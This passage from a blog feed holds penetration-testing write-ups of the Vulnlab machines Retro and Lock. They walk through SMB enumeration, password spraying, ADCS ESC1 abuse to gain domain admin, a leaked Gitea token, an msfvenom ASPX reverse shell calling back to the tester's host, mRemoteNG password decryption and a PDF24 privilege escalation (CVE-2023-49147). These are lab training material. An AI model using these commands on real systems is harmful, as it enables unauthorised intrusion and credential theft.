-i</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f" title="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f">https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Retro</title>
      <link href="/2025/03/11/VL-Retro/"/>
      <url>/2025/03/11/VL-Retro/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-10 21:02:43Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RETRO</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: retro.vl</span><br><span class="line">|   DNS_Computer_Name: DC.retro.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-10T21:03:27+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Issuer: commonName=DC.retro.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-09T21:01:16</span><br><span class="line">| Not valid after:  2025-09-08T21:01:16</span><br><span class="line">| MD5:   57df:2f2a:42f8:12ba:1acb:785c:ad91:ac2b</span><br><span class="line">| SHA-1: 6a2d:a6d3:9d5e:38a0:ebd7:8775:5f7f:1659:3733:78eb</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 48062/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 9402/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 6737/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 6198/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-10T21:03:28</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>As there is not much exposed on the machine first we will try smb null session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.98.48 -N</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/SMB-Nullses.png" alt="SMB-Nullses"><br>We can see that we can use null session and there is a <code>Trainees</code> share that looks interesting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Trainees -N</span><br></pre></td></tr></table></figure><p>Inside the share there is a <code>Important.txt</code> file we will get it to our machine with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get Important.txt</span><br></pre></td></tr></table></figure><p>Opening that file we see the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dear Trainees,</span><br><span class="line"></span><br><span class="line">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class="line">So we decided to bundle every one of you up into one account.</span><br><span class="line">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">The Admins</span><br></pre></td></tr></table></figure><p>Now we will start searching for that account and try to brute force the password, we can use <code>impacket-lookupsid</code> to get some valid usernames as we have access to the null session.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.98.48 -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/lookupsid.png" alt="lookupsid"><br>The account that the trainees use is called <code>trainee</code> (we could have guessed it but ok)</p><p>After spraying it with some common password we tried to put the username as the password and it worked<br><img src="/images/Retro/trainee-smb.png" alt="trainee-smb"><br>Also we can see that now we have read access to the Notes share</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Notes -U &quot;trainee&quot;</span><br></pre></td></tr></table></figure><p>And we download the file named <code>ToDo.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get ToDo.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thomas,</span><br><span class="line"></span><br><span class="line">after convincing the finance department to get rid of their ancienct banking software</span><br><span class="line">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class="line">computer account. That one is older than me.</span><br><span class="line"></span><br><span class="line">Best</span><br><span class="line"></span><br><span class="line">James </span><br></pre></td></tr></table></figure><p>After reading the <code>ToDo.txt</code> i started digging around for some info on old computer accounts and how they were created, and i found in an article the following</p><p>Note : In older Active Directories, it is possible to find accounts marked as “Assign this computer account as a pre-Windows 2000.” The password for these machine accounts is the lowercase name of the machine account itself. For example, the password for the machine account “XMCO$” would be “xmco”.</p><p><a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a></p><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>I used bloodhound python to get a better understanding of the domain</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;trainee&quot; -p &quot;trainee&quot; -d retro.vl -dc DC.retro.vl -ns 10.10.98.48 --zip</span><br></pre></td></tr></table></figure><p>Using the below query we can see there are 2 machines:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:Computer) RETURN n</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/mchine-accounts.png" alt="mchine-accounts"><br>We will try to use the machine account name <code>Banking$</code> with the password <code>banking</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.98.48 -u &#x27;Banking$&#x27; -p banking</span><br></pre></td></tr></table></figure><p>The error that we get is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> this can be fixed by changing password for the machine account.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro.vl/BANKING$&#x27;:banking@10.10.98.48 -newpass StrongP@ss1234 -dc-ip 10.10.98.48 -p rpc-samr</span><br></pre></td></tr></table></figure><h3 id="AD-CS"><a href="#AD-CS" class="headerlink" title="AD CS"></a>AD CS</h3><p>Running certipy to find any templates that may be vulnurable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;banking$&#x27;@retro.vl -p StrongP@ss1234 -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>After opening the text file we see that one template is vulnerable to <code>ESC1</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : RetroClients</span><br><span class="line">    Display Name                        : Retro Clients</span><br><span class="line">    Certificate Authorities             : retro-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Domain Computers</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : RETRO.VL\Administrator</span><br><span class="line">        Write Owner Principals          : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Dacl Principals           : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Property Principals       : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;RETRO.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>We can exploit ESC1 we will use the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &quot;banking$&quot; -p &quot;StrongP@ss1234&quot; -target retro.vl -upn administrator@retro.vl -ca retro-DC-CA -template RetroClients</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/ESC01-Certipy.png" alt="ESC01-Certipy"><br>It fails with <code>CERTSRV_E_KEY_LENGTH</code> looking into it we find this article <a href="https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/">https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/</a></p><p>That states:</p><p>This error occurs if the key length in the certificate request is less than configured in the certificate template configured for the NDES server. Thus, either the “Minimum Key Length” in the certificate template must be reduced, or a new certificate request with a sufficiently large key must be formed and sent to the NDES server.</p><p>Looking back at the certipy output we see that tamplate requires a minimum RSA key of 4096 Bytes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;BANKING$&#x27;@retro.vl -p &quot;StrongP@ss1234&quot; -dc-ip 10.10.98.48 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096</span><br></pre></td></tr></table></figure><h4 id="First-way"><a href="#First-way" class="headerlink" title="First way"></a>First way</h4><p>Now that we have the <code>administrator.pfx</code> we will spawn an ldap shell and create a new user and add him to Domain Admins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 192.168.0.100 -ldap-shell</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_user EvilAdmin  </span><br><span class="line">add_user_to_group EvilAdmin &#x27;Domain Admins&#x27;</span><br></pre></td></tr></table></figure><h4 id="Second-way"><a href="#Second-way" class="headerlink" title="Second way"></a>Second way</h4><p>We will get a valid TGT as administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>Using that hash to get a shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass -dc-ip 10.10.98.48 retro.vl/administrator@DC.retro.vl</span><br></pre></td></tr></table></figure><p>Using <code>impacket-wmiexec</code> we can get a shell and grab our flags</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec EvilAdmin:&#x27;l0KHCK8F0Y?&lt;&amp;_T&#x27;@10.10.98.48</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242">https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Lock</title>
      <link href="/2025/03/10/VL-Lock/"/>
      <url>/2025/03/10/VL-Lock/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 995 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LOCK</span><br><span class="line">|   NetBIOS_Domain_Name: LOCK</span><br><span class="line">|   NetBIOS_Computer_Name: LOCK</span><br><span class="line">|   DNS_Domain_Name: Lock</span><br><span class="line">|   DNS_Computer_Name: Lock</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-08T14:18:31+00:00</span><br><span class="line">5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-website.png" alt="Gitea website"></p><p>Possible Username: <code>ellen.freeman</code></p><p>Looking into the commits we can find the gitea personal token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/ellen.freeman/dev-scripts/commit/8b78e6c3024416bce55926faa3f65421a25d6370</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-Token.png" alt="Gitea Token"></p><p>Modifying the script so it uses the AUTH token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def format_domain(domain):</span><br><span class="line">    if not domain.startswith((&#x27;http://&#x27;, &#x27;https://&#x27;)):</span><br><span class="line">        domain = &#x27;https://&#x27; + domain</span><br><span class="line">    return domain</span><br><span class="line"></span><br><span class="line">def get_repositories(token, domain):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;Authorization&#x27;: f&#x27;token &#123;token&#125;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    url = f&#x27;&#123;domain&#125;/api/v1/user/repos&#x27;</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(f&#x27;Failed to retrieve repositories: &#123;response.status_code&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;Usage: python script.py &lt;gitea_domain&gt;&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    gitea_domain = format_domain(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    personal_access_token = &#x27;TOKEN&#x27;  # Use the provided token directly</span><br><span class="line">    if not personal_access_token:</span><br><span class="line">        print(&quot;Error: GITEA_ACCESS_TOKEN environment variable not set.&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        repos = get_repositories(personal_access_token, gitea_domain)</span><br><span class="line">        print(&quot;Repositories:&quot;)</span><br><span class="line">        for repo in repos:</span><br><span class="line">            print(f&quot;- &#123;repo[&#x27;full_name&#x27;]&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>we will get back the 2 repos she has made </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Repositories:</span><br><span class="line">- ellen.freeman/dev-scripts</span><br><span class="line">- ellen.freeman/website</span><br></pre></td></tr></table></figure><p>After cloning the website repo with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Readme-helpfull.png" alt="Helpful Readme"><br>we see in the readme.md that any change we make on the repo it will reflect on the actual website so now we can create a .aspx shell and place it on the website.</p><p>Generating a shell with msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><p>And before we push our changes to the repo we need to setup git:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name ellen.freeman</span><br><span class="line">git config --global user.email ellen.freeman@lock.vl</span><br></pre></td></tr></table></figure><p>Inside the repo we will add the new file, commit it and push it to the repo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add shell.aspx</span><br><span class="line">git commit -m &quot;shell&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>Then we start our listener and curl the wesbite for the shell to trigger:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nlvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://lock.vl/shell.aspx</span><br></pre></td></tr></table></figure><p><code>Sometimes it takes a couple of minutes untill the pipeline builds the changes we did on the repository, do not do multiple pushes to the repo as it restarts the process</code><br><img src="/images/Lock/Shell-as-Elen.png" alt="Shell as Ellen"></p><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><h3 id="Ellen-Freeman-to-Gale-Dekarios"><a href="#Ellen-Freeman-to-Gale-Dekarios" class="headerlink" title="Ellen.Freeman to Gale.Dekarios"></a>Ellen.Freeman to Gale.Dekarios</h3><p>Inside the <code>Directory of c:\Users\ellen.freeman\Documents</code> there is a <code>config.xml</code><br>taking a look into the xml we can see that its a file for Multi-Remote Next Generation Connection Manager <a href="https://mremoteng.org/">https://mremoteng.org/</a>. With a google search we can find a github repo that decripts the password that on the <code>config.xml</code><br><a href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gquere/mRemoteNG_password_decrypt</span><br><span class="line">cd mRemoteNG_password_decrypt-master</span><br><span class="line">python3 mremoteng_decrypt.py ../config.xml</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-PAss.png" alt="RDP Password"></p><p>Using xfreerdp we will establish an rdp session with the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.78.85 /u:Gale.Dekarios /p:</span><br></pre></td></tr></table></figure><h3 id="PDF24-CVE-2023-49147"><a href="#PDF24-CVE-2023-49147" class="headerlink" title="PDF24 - CVE-2023-49147"></a>PDF24 - CVE-2023-49147</h3><p>After getting into the rdp session we can grab the user flag and see that there is a program called PDF24 after a simple google search we can see that there is a privilege escalation exploit for it <a href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a></p><p>First we need to locate the msi installer, after some digging around (dont forget to look for hidden folders)<br><img src="/images/Lock/MSI-file.png" alt="MSI file"></p><p>Now we need to <code>SetOpLock.exe</code> to the machine, as we have rdp we can just copy paste it.</p><p>We will open two terminals in one of them we will lock the log file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetOpLock.exe &quot;C:\Program Files\PDF24\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure><p>And then we will patch the PDF24 app </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-exploits.png" alt="RDP exploits"></p><p>After you let it load you can follow the github instructions to get a shell:</p><ul><li>right click on the top bar of the cmd window</li><li>click on properties</li><li>under options click on the “Legacyconsolemode” link</li><li>open the link with a browser other than internet explorer or edge (both don’t open as SYSTEM when on Win11)</li><li>in the opened browser window press the key combination CTRL+o</li><li>type cmd.exe in the top bar and press Enter</li></ul><p><a href="https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464">https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Baby</title>
      <link href="/2025/03/08/VL-Baby/"/>
      <url>/2025/03/08/VL-Baby/</url>
      
